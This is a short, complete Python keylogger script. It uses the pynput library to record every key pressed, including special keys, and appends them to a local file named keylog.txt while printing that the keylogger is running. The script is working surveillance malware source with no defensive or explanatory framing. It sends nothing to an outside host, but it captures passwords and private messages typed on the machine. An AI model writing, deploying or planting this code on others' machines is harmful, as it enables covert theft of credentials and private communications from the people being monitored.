from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'[{key}]')  # For special keys like Enter, Space, etc.

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener.join()
